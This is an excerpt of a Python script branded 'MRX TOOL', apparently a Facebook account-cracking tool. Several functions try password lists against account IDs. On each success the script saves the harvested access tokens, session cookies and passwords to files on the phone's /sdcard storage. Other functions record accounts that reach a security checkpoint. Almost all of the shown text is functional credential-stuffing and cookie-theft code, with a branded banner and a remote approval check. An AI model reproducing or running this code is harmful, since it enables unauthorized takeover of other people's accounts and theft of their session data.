...
# OWNER BY SCRIPT : MRX
# GITHUB LINK : MRX
# MACK BY : MUHAMMAD ZAHIRUL
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
print("\x1b[38;5;46m➤\x1b[1;97m WELCOME MRX TOOL")
...
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;✘ MRX ✘ XD ✘\x07')
...
myweb2 = requests.get("https://github.com/SKBER-CYBER/Contol/blob/main/MRX").text
def apv():
	try:
		clear()
		x = requests.get("https://github.com/SKBER-CYBER/Contol/blob/main/MRX").text
...
{A}           ████  ████ ██   ██  ██ ██ 
 {A}          ██ ████ ██ ██████    ███ 
     ...
     {A}      ██      ██ ██   ██ ██   ██    \x1b[38;5;46m➤ 1.7
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m➤{A} FACEBOOK     {R}:{A} MUHAMMAD ZAHIRUL
\x1b[38;5;46m➤{A} GITHUB       {R}:{A} MRX
...
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}MRX-M1{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                print(f'\r\r\x1b[38;5;46m➤ {A}[{G}MRX-OK{A}]{G} '+ids+f' | '+pas+'')
                open('/sdcard/MRX-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/MRX-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}MRX-M2{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                ...
                open('/sdcard/MRX-FILE-M2-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/MRX-FILE-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def api3(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}MRX-M3{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m➤ {A}[{G}MRX-OK{A}]{G} '+ids+f'|'+pas+'')
                open('/sdcard/MRX-FILE-M3-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/MRX-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
...
def __API__(ids,passlist,tl,ck):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}MRX-RN{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Photoshop' in res:
                    if "Y" in ck:
                        ...
                        open('/sdcard/MRX-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/MRX-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+coki+'\n')
                        oks.append(cid)
                        break
                    else:
                        print(f'\r\rx1b[38;5;46m➤ {A}[{G}MRX-OK{A}]{G} {cid} | {pas} ')
